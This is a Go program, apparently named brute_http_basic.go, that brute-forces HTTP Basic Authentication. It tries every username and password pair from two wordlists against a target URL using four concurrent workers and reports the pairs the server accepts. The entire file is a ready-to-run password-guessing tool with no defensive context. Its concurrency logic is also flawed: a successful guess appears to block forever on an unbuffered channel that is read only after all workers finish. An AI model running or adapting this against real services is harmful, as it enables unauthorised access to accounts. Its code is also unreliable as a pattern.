package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

type Credentials struct {
	Username string
	Password string
}

func worker(url string, credCh <-chan Credentials, successCh chan<- Credentials, wg *sync.WaitGroup) {
	defer wg.Done()

	fmt.Println("[*] Starting new worker goroutine.")
	for creds := range credCh {
		// Send a GET request with Basic Auth
		client := &http.Client{
			Timeout: 10 * time.Second,
		}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println("[-] Error creating request:", err)
			continue
		}
		req.SetBasicAuth(creds.Username, creds.Password)

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] Connection error:", err)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusUnauthorized {
			fmt.Printf("[-] Failure: %s/%s\n", creds.Username, creds.Password)
		} else {
			fmt.Printf("[+] Success: %s/%s\n", creds.Username, creds.Password)
			successCh <- creds
			return
		}
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("USAGE: brute_http_basic.go url userfile passfile")
		os.Exit(1)
	}

	url := os.Args[1]
	userFile := os.Args[2]
	passFile := os.Args[3]

	credCh := make(chan Credentials)
	successCh := make(chan Credentials)
	var wg sync.WaitGroup

	// Create worker goroutines
	numWorkers := 4 // Set to your desired number of goroutines
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker(url, credCh, successCh, &wg)
	}

	// Read usernames and passwords
	go func() {
		file, err := os.Open(userFile)
		if err != nil {
			fmt.Println("[-] Error opening user file:", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			username := scanner.Text()
			if username == "" {
				continue
			}

			file, err = os.Open(passFile)
			if err != nil {
				fmt.Println("[-] Error opening password file:", err)
				return
			}
			defer file.Close()

			scannerPwd := bufio.NewScanner(file)
			for scannerPwd.Scan() {
				password := scannerPwd.Text()
				if password == "" {
					continue
				}
				credCh <- Credentials{Username: username, Password: password}
			}
			file.Close()
		}
		if err := scanner.Err(); err != nil {
			fmt.Println("[-] Error reading user file:", err)
		}
		close(credCh)
	}()

	// Wait for all workers to finish
	wg.Wait()
	close(successCh)

	// Print successful credentials
	for creds := range successCh {
		fmt.Printf("User: %s Pass: %s\n", creds.Username, creds.Password)
	}
}

